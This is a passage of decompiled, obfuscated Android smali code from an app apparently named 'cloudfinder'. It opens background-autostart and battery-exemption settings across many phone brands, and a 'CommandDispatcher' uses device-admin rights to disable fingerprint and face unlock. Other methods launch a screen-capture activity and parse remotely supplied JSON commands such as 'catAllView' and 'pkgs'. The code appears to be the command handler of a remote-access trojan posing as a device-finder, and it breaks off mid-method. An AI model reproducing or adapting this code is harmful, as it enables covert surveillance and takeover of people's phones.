    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    const/high16 v2, 0x10000000

    if-eqz v1, :cond_4

    :try_start_2
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0}, Landroid/content/Intent;-><init>()V

    const-string v1, "com.samsung.android.sm.ACTION_OPEN_CHECKABLE_LISTACTIVITY"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "com.samsung.android.lool"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setPackage(Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "activity_type"

    invoke-virtual {v0, v1, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v6}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object v1

    if-eqz v1, :cond_11

    invoke-virtual {v6, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto/16 :goto_5

    :cond_4
    :try_start_3
    const-string v1, "honor"

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    const-string v3, "com.huawei.systemmanager.optimize.process.ProtectActivity"

    const-string v5, "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"

    const-string v11, "com.huawei.systemmanager"

    if-eqz v1, :cond_5

    :try_start_4
    new-array v0, v10, [[Ljava/lang/String;

    new-array v1, v7, [Ljava/lang/String;

    const-string v2, "com.hihonor.systemmanager"

    aput-object v2, v1, v9

    const-string v2, "com.hihonor.systemmanager.startupmgr.ui.StartupNormalAppListActivity"

    aput-object v2, v1, v8

    aput-object v1, v0, v9

    filled-new-array {v11, v5}, [Ljava/lang/String;

    move-result-object v1

    aput-object v1, v0, v8

    filled-new-array {v11, v3}, [Ljava/lang/String;

    move-result-object v1

    aput-object v1, v0, v7

    invoke-static {v6, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    goto/16 :goto_5

    :cond_5
    const-string v1, "huawei"

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_6

    new-array v0, v10, [[Ljava/lang/String;

    filled-new-array {v11, v5}, [Ljava/lang/String;

    move-result-object v1

    aput-object v1, v0, v9

    filled-new-array {v11, v3}, [Ljava/lang/String;

    move-result-object v1

    aput-object v1, v0, v8

    new-array v1, v7, [Ljava/lang/String;

    aput-object v11, v1, v9

    const-string v2, "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"

    aput-object v2, v1, v8

    aput-object v1, v0, v7

    invoke-static {v6, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    goto/16 :goto_5

    :cond_6
    const-string v1, "tecno"

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_e

    const-string v1, "infinix"

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-nez v1, :cond_e

    const-string v1, "itel"

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_7

    goto/16 :goto_2

    :cond_7
    const-string v1, "asus"

    invoke-virtual {v4, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    if-eqz v1, :cond_9

    :try_start_5
    new-instance v1, Landroid/content/Intent;

    const-string v3, "android.intent.action.VIEW"

    invoke-direct {v1, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v3, "mobilemanager://function/entry/AutoStart"

    invoke-static {v3}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v3

    invoke-virtual {v1, v3}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    invoke-virtual {v1, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v6}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object v2

    if-eqz v2, :cond_8

    invoke-virtual {v6, v1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_0

    goto/16 :goto_5

    :catch_0
    :cond_8
    :try_start_6
    new-array v1, v7, [[Ljava/lang/String;

    new-array v2, v7, [Ljava/lang/String;

    aput-object v0, v2, v9

    const-string v3, "com.asus.mobilemanager.autostart.AutoStartActivity"

    aput-object v3, v2, v8

    aput-object v2, v1, v9

    new-array v2, v7, [Ljava/lang/String;

    aput-object v0, v2, v9

    const-string v0, "com.asus.mobilemanager.entry.FunctionActivity"

    aput-object v0, v2, v8

    aput-object v2, v1, v8

    invoke-static {v6, v1}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    goto/16 :goto_5

    :cond_9
    const-string v0, "nokia"

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_d

    const-string v0, "hmd"

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_a

    goto :goto_1

    :cond_a
    const-string v0, "meizu"

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_b

    new-array v0, v7, [[Ljava/lang/String;

    new-array v1, v7, [Ljava/lang/String;

    const-string v2, "com.meizu.safe"

    aput-object v2, v1, v9

    const-string v2, "com.meizu.safe.permission.SmartBGActivity"

    aput-object v2, v1, v8

    aput-object v1, v0, v9

    new-array v1, v8, [Ljava/lang/String;

    const-string v2, "com.meizu.safe.security.SHOW_APPSEC"

    aput-object v2, v1, v9

    aput-object v1, v0, v8

    invoke-static {v6, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    goto/16 :goto_5

    :cond_b
    const-string v0, "letv"

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_c

    const-string v0, "leeco"

    invoke-virtual {v4, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_11

    :cond_c
    new-array v0, v8, [[Ljava/lang/String;

    new-array v1, v7, [Ljava/lang/String;

    const-string v2, "com.letv.android.letvsafe"

    aput-object v2, v1, v9

    const-string v2, "com.letv.android.letvsafe.AutobootManageActivity"

    aput-object v2, v1, v8

    aput-object v1, v0, v9

    invoke-static {v6, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    goto/16 :goto_5

    :cond_d
    :goto_1
    new-array v0, v7, [[Ljava/lang/String;

    new-array v1, v7, [Ljava/lang/String;

    const-string v2, "com.evenwell.powersaving.g3"

    aput-object v2, v1, v9

    const-string v2, "com.evenwell.powersaving.g3.exception.PowerSaverExceptionActivity"

    aput-object v2, v1, v8

    aput-object v1, v0, v9

    new-array v1, v7, [Ljava/lang/String;

    const-string v2, "com.hmd.devicepoweroptimizer"

    aput-object v2, v1, v9

    const-string v2, "com.hmd.devicepoweroptimizer.PowerOptimizerActivity"

    aput-object v2, v1, v8

    aput-object v1, v0, v8

    invoke-static {v6, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    goto/16 :goto_5

    :cond_e
    :goto_2
    new-array v0, v8, [[Ljava/lang/String;

    new-array v1, v7, [Ljava/lang/String;

    const-string v2, "com.transsion.phonemaster"

    aput-object v2, v1, v9

    const-string v2, "com.cyin.himgr.autostart.AutoStartActivity"

    aput-object v2, v1, v8

    aput-object v1, v0, v9

    invoke-static {v6, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    goto :goto_5

    :cond_f
    :goto_3
    const/4 v0, 0x7

    new-array v0, v0, [[Ljava/lang/String;

    new-array v1, v7, [Ljava/lang/String;

    aput-object v2, v1, v9

    const-string v4, "com.oplus.startupapp.view.StartupAppListActivity"

    aput-object v4, v1, v8

    aput-object v1, v0, v9

    new-array v1, v7, [Ljava/lang/String;

    aput-object v2, v1, v9

    const-string v2, "com.oplus.powermanager.fuelgaue.PowerConsumptionActivity"

    aput-object v2, v1, v8

    aput-object v1, v0, v8

    new-array v1, v7, [Ljava/lang/String;

    aput-object v3, v1, v9

    const-string v2, "com.coloros.safecenter.startupapp.StartupAppListActivity"

    aput-object v2, v1, v8

    aput-object v1, v0, v7

    new-array v1, v7, [Ljava/lang/String;

    aput-object v3, v1, v9

    const-string v2, "com.coloros.safecenter.permission.startup.StartupAppListActivity"

    aput-object v2, v1, v8

    aput-object v1, v0, v10

    new-array v1, v7, [Ljava/lang/String;

    const-string v2, "com.coloros.safe"

    aput-object v2, v1, v9

    const-string v2, "com.coloros.safe.permission.startup.StartupAppListActivity"

    aput-object v2, v1, v8

    const/4 v2, 0x4

    aput-object v1, v0, v2

    new-array v1, v7, [Ljava/lang/String;

    const-string v2, "com.oppo.safe"

    aput-object v2, v1, v9

    const-string v2, "com.oppo.safe.permission.startup.StartupAppListActivity"

    aput-object v2, v1, v8

    const/4 v2, 0x5

    aput-object v1, v0, v2

    new-array v1, v7, [Ljava/lang/String;

    aput-object v3, v1, v9

    const-string v2, "com.coloros.safecenter.permission.startupmanager.StartupAppListActivity"

    aput-object v2, v1, v8

    const/4 v2, 0x6

    aput-object v1, v0, v2

    invoke-static {v6, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    goto :goto_5

    :cond_10
    :goto_4
    new-array v0, v7, [[Ljava/lang/String;

    new-array v1, v7, [Ljava/lang/String;

    const-string v2, "com.miui.securitycenter"

    aput-object v2, v1, v9

    const-string v2, "com.miui.permcenter.autostart.AutoStartManagementActivity"

    aput-object v2, v1, v8

    aput-object v1, v0, v9

    new-array v1, v8, [Ljava/lang/String;

    const-string v2, "miui.intent.action.OP_AUTO_START"

    aput-object v2, v1, v9

    aput-object v1, v0, v8

    invoke-static {v6, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    goto :goto_5

    :catch_1
    move-exception v0

    const-string v1, "BrandIntentHelper"

    const-string v2, "openAutoStart error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :catch_2
    :cond_11
    :goto_5
    return-void
.end method

.method public final إ()V
    .locals 13

    const-string v0, "com.samsung.android.sm.ui.battery.BatteryActivity"

    const-string v1, "com.samsung.android.lool"

    const-string v2, "com.iqoo.secure"

    sget-object v3, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    if-nez v3, :cond_0

    const-string v3, ""

    goto :goto_0

    :cond_0
    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    :goto_0
    :try_start_0
    const-string v4, "vivo"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    iget-object v5, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const/high16 v6, 0x10000000

    const/4 v7, 0x3

    const/4 v8, 0x2

    const/4 v9, 0x1

    const/4 v10, 0x0

    if-eqz v4, :cond_2

    :try_start_1
    new-array v0, v8, [[Ljava/lang/String;

    new-array v1, v8, [Ljava/lang/String;

    const-string v3, "com.vivo.abe"

    aput-object v3, v1, v10

    const-string v3, "com.vivo.applicationbehaviorengine.ui.ExcessivePowerManagerActivity"

    aput-object v3, v1, v9

    aput-object v1, v0, v10

    new-array v1, v8, [Ljava/lang/String;

    aput-object v2, v1, v10

    const-string v3, "com.iqoo.secure.ui.powersaving.PowerSavingManagerActivity"

    aput-object v3, v1, v9

    aput-object v1, v0, v9

    invoke-static {v5, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    move-result v0
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    if-eqz v0, :cond_1

    goto/16 :goto_3

    :cond_1
    :try_start_2
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.intent.action.POWER_USAGE_SUMMARY"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto/16 :goto_3

    :catch_0
    :try_start_3
    new-array v0, v7, [[Ljava/lang/String;

    new-array v1, v8, [Ljava/lang/String;

    const-string v3, "com.vivo.permissionmanager"

    aput-object v3, v1, v10

    const-string v3, "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"

    aput-object v3, v1, v9

    aput-object v1, v0, v10

    new-array v1, v8, [Ljava/lang/String;

    aput-object v2, v1, v10

    const-string v3, "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager"

    aput-object v3, v1, v9

    aput-object v1, v0, v9

    new-array v1, v8, [Ljava/lang/String;

    aput-object v2, v1, v10

    const-string v2, "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"

    aput-object v2, v1, v9

    aput-object v1, v0, v8

    invoke-static {v5, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    goto/16 :goto_3

    :cond_2
    const-string v2, "xiaomi"

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_9

    const-string v2, "redmi"

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_9

    const-string v2, "poco"

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3

    goto/16 :goto_2

    :cond_3
    const-string v2, "oppo"

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_8

    const-string v2, "realme"

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-nez v2, :cond_8

    const-string v2, "oneplus"

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_4

    goto/16 :goto_1

    :cond_4
    const-string v2, "honor"

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    const-string v4, "com.huawei.systemmanager.optimize.process.ProtectActivity"

    const-string v11, "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"

    const-string v12, "com.huawei.systemmanager"

    if-eqz v2, :cond_5

    :try_start_4
    new-array v0, v7, [[Ljava/lang/String;

    new-array v1, v8, [Ljava/lang/String;

    const-string v2, "com.hihonor.systemmanager"

    aput-object v2, v1, v10

    const-string v2, "com.hihonor.systemmanager.startupmgr.ui.StartupNormalAppListActivity"

    aput-object v2, v1, v9

    aput-object v1, v0, v10

    filled-new-array {v12, v11}, [Ljava/lang/String;

    move-result-object v1

    aput-object v1, v0, v9

    filled-new-array {v12, v4}, [Ljava/lang/String;

    move-result-object v1

    aput-object v1, v0, v8

    invoke-static {v5, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_a

    goto/16 :goto_3

    :cond_5
    const-string v2, "huawei"

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_6

    new-array v0, v8, [[Ljava/lang/String;

    filled-new-array {v12, v11}, [Ljava/lang/String;

    move-result-object v1

    aput-object v1, v0, v10

    filled-new-array {v12, v4}, [Ljava/lang/String;

    move-result-object v1

    aput-object v1, v0, v9

    invoke-static {v5, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_a

    goto/16 :goto_3

    :cond_6
    const-string v2, "samsung"

    invoke-virtual {v3, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_7

    new-array v2, v7, [[Ljava/lang/String;

    new-array v3, v8, [Ljava/lang/String;

    aput-object v1, v3, v10

    const-string v4, "com.samsung.android.sm.battery.ui.BatteryActivity"

    aput-object v4, v3, v9

    aput-object v3, v2, v10

    filled-new-array {v1, v0}, [Ljava/lang/String;

    move-result-object v1

    aput-object v1, v2, v9

    new-array v1, v8, [Ljava/lang/String;

    const-string v3, "com.samsung.android.sm"

    aput-object v3, v1, v10

    aput-object v0, v1, v9

    aput-object v1, v2, v8

    invoke-static {v5, v2}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_a

    goto :goto_3

    :cond_7
    const-string v0, "asus"

    invoke-virtual {v3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_a

    new-array v0, v9, [[Ljava/lang/String;

    new-array v1, v8, [Ljava/lang/String;

    const-string v2, "com.asus.mobilemanager"

    aput-object v2, v1, v10

    const-string v2, "com.asus.mobilemanager.powersaver.PowerSaverSettings"

    aput-object v2, v1, v9

    aput-object v1, v0, v10

    invoke-static {v5, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_a

    goto :goto_3

    :cond_8
    :goto_1
    new-array v0, v9, [[Ljava/lang/String;

    new-array v1, v8, [Ljava/lang/String;

    const-string v2, "com.coloros.oppoguardelf"

    aput-object v2, v1, v10

    const-string v2, "com.coloros.powermanager.fuelgaue.PowerConsumptionActivity"

    aput-object v2, v1, v9

    aput-object v1, v0, v10

    invoke-static {v5, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_a

    goto :goto_3

    :cond_9
    :goto_2
    new-array v0, v9, [[Ljava/lang/String;

    new-array v1, v8, [Ljava/lang/String;

    const-string v2, "com.miui.powerkeeper"

    aput-object v2, v1, v10

    const-string v2, "com.miui.powerkeeper.ui.HiddenAppsContainerManagementActivity"

    aput-object v2, v1, v9

    aput-object v1, v0, v10

    invoke-static {v5, v0}, Lڗًقڔ/؋;->ډ(Landroid/content/Context;[[Ljava/lang/String;)Z

    move-result v0
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    if-eqz v0, :cond_a

    goto :goto_3

    :cond_a
    :try_start_5
    new-instance v0, Landroid/content/Intent;

    const-string v1, "android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v5}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->resolveActivity(Landroid/content/pm/PackageManager;)Landroid/content/ComponentName;

    move-result-object v1

    if-eqz v1, :cond_b

    invoke-virtual {v5, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    goto :goto_3

    :catch_1
    move-exception v0

    const-string v1, "BrandIntentHelper"

    const-string v2, "openBatterySettings error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :catch_2
    :cond_b
    :goto_3
    return-void
.end method

.method public final ئ(Z)V
    .locals 5

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "CommandDispatcher"

    :try_start_0
    const-string v2, "device_policy"

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/admin/DevicePolicyManager;

    new-instance v3, Landroid/content/ComponentName;

    const-class v4, Lcom/lite/cloudfinder/rda;

    invoke-direct {v3, v0, v4}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    if-eqz v2, :cond_3

    invoke-virtual {v2, v3}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-nez v0, :cond_0

    goto :goto_3

    :cond_0
    if-eqz p1, :cond_1

    const/16 v0, 0xa0

    invoke-virtual {v2, v3, v0}, Landroid/app/admin/DevicePolicyManager;->setKeyguardDisabledFeatures(Landroid/content/ComponentName;I)V

    const-string v0, "Biometric unlock DISABLED (fingerprint + face)"

    :goto_0
    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    :cond_1
    const/4 v0, 0x0

    invoke-virtual {v2, v3, v0}, Landroid/app/admin/DevicePolicyManager;->setKeyguardDisabledFeatures(Landroid/content/ComponentName;I)V

    const-string v0, "Biometric unlock ENABLED"

    goto :goto_0

    :goto_1
    const-string v0, "biometric_lock"

    if-eqz p1, :cond_2

    const-string p1, "DISABLED"

    goto :goto_2

    :cond_2
    const-string p1, "ENABLED"

    :goto_2
    invoke-static {v0, p1}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_4

    :cond_3
    :goto_3
    const-string p1, "handleBiometricLock: Device Admin not active"

    invoke-static {v1, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p1

    const-string v0, "handleBiometricLock error"

    invoke-static {v1, v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_4
    return-void
.end method

.method public final ا()V
    .locals 3

    :try_start_0
    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    invoke-static {v0}, Lڗًقڔ/؋;->ق(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "callAcc error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public final ب()V
    .locals 5

    iget-object v0, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-string v1, "package:"

    :try_start_0
    new-instance v2, Landroid/content/Intent;

    const-string v3, "android.settings.APPLICATION_DETAILS_SETTINGS"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {v2, v3, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v2, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "callAppSetting error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void
.end method

.method public final ة()V
    .locals 3

    :try_start_0
    iget-object v0, p0, Lڜٟٱڀ/أ;->أ:Landroid/os/PowerManager$WakeLock;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lڜٟٱڀ/أ;->أ:Landroid/os/PowerManager$WakeLock;

    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V

    :cond_0
    iget-object v0, p0, Lڜٟٱڀ/أ;->ؤ:Landroid/net/wifi/WifiManager$WifiLock;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager$WifiLock;->isHeld()Z

    move-result v0

    if-eqz v0, :cond_1

    iget-object v0, p0, Lڜٟٱڀ/أ;->ؤ:Landroid/net/wifi/WifiManager$WifiLock;

    invoke-virtual {v0}, Landroid/net/wifi/WifiManager$WifiLock;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "CommandDispatcher"

    const-string v2, "cancelWakeup error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_1
    :goto_0
    return-void
.end method

.method public final ت()V
    .locals 3

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lڜٟٱڀ/أ;->؋:Landroid/content/Context;

    const-class v2, Lcom/lite/cloudfinder/activity/ScreenCaptureActivity;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v2, 0x10000000

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void
.end method

.method public final ث()V
    .locals 0

    invoke-virtual {p0}, Lڜٟٱڀ/أ;->ړ()V

    return-void
.end method

.method public final ج(Lorg/json/JSONObject;)V
    .locals 5

    const-string v0, "enable"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v0

    iput-boolean v0, p0, Lڜٟٱڀ/أ;->ء:Z

    sput-boolean v0, Lسۄھؤۏ۫/؋;->ئ:Z

    const-string v0, "screenRule"

    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v0

    if-eqz v0, :cond_0

    iput-object v0, p0, Lڜٟٱڀ/أ;->آ:Lorg/json/JSONArray;

    :cond_0
    iget-boolean v2, p0, Lڜٟٱڀ/أ;->ء:Z

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const-string v3, "catAllView"

    invoke-static {v2, v3}, Lcom/lite/cloudfinder/App;->ؠ(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v2, "rexp"

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->opt(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    invoke-static {v3, v2}, Lcom/lite/cloudfinder/App;->ؠ(Ljava/lang/Object;Ljava/lang/String;)V

    :cond_1
    const-string v2, "pkgs"

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_2

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->opt(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    invoke-static {v3, v2}, Lcom/lite/cloudfinder/App;->ؠ(Ljava/lang/Object;Ljava/lang/String;)V

    :cond_2
    const-string v2, "refuse"

    invoke-virtual {p1, v2}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v3

